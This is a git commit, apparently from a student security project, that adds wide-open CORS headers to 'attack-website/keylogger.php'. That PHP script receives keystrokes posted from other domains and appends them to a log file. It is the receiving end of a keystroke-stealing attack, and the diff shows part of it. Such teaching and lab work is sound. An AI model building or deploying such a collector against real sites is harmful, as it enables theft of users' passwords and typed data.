aed2f42e1b3ac787cf69c07a82e326f821b89381
eDr0pko <esteban.fanjul@isen-ouest.yncrea.fr>
2025-03-31 14:50:36 +0200

    push les requete venant d'un autre domaine

--- attack-website/keylogger.php
+++ attack-website/keylogger.php
@@ -1,4 +1,10 @@
 <?php
+
+    header("Access-Control-Allow-Origin: *");
+    header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
+    header("Access-Control-Allow-Headers: Content-Type");
+
+
     $keys = $_POST["key"];
     $filename = 'keylogger.txt';
     $file = fopen($filename, 'a+');
